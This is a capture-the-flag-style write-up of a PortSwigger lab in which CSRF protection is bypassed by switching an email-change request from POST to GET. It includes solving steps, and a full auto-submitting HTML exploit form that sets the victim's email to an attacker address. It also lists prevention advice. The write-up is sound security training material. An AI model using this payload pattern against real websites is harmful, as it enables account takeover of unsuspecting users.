# Lab: CSRF where token validation depends on request method

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF)  
**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

## 🎯 Objective
Bypass the weak CSRF protection and change the victim's email address.

## 📖 Description
The application uses a CSRF token to protect the email change functionality. However, the token validation is only applied to `POST` requests. `GET` requests are not validated.

## 🔍 Vulnerability Analysis

- **Vulnerable Endpoint**: `/my-account/change-email`
- **Defense Weakness**: Token validation depends on the HTTP request method (`POST` only).
- **Bypass Technique**: Use `GET` method instead of `POST`.

## 🛠️ How to Solve (Step by Step)

1. Log in with `wiener:peter`.
2. Capture a normal email change request in Burp Suite.
3. Notice that a `csrf` token is sent with `POST` requests.
4. Change the request method to `GET` and remove or ignore the token.
5. Create an exploit that uses a `GET` request.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit - Method Bypass</title>
</head>
<body>
    <h1>Updating your account...</h1>
    
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>

    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```
🚀 Delivery Steps

Go to Exploit Server.
Paste the HTML in the Body section.
Deliver to victim.
The lab solves when the email is changed.

⚡ Impact
An attacker can perform state-changing actions using simple GET requests, bypassing the intended CSRF protection.
🛡️ Prevention Methods

Validate CSRF token regardless of HTTP method.
Reject GET requests for state-changing operations (use POST/PUT/DELETE only).
Follow RESTful principles: GET should be safe and idempotent.

🔬 Key Learning Points

CSRF defenses must cover all HTTP methods that perform actions.
Relying only on request method for security is dangerous.
Always validate tokens on every state-changing request.
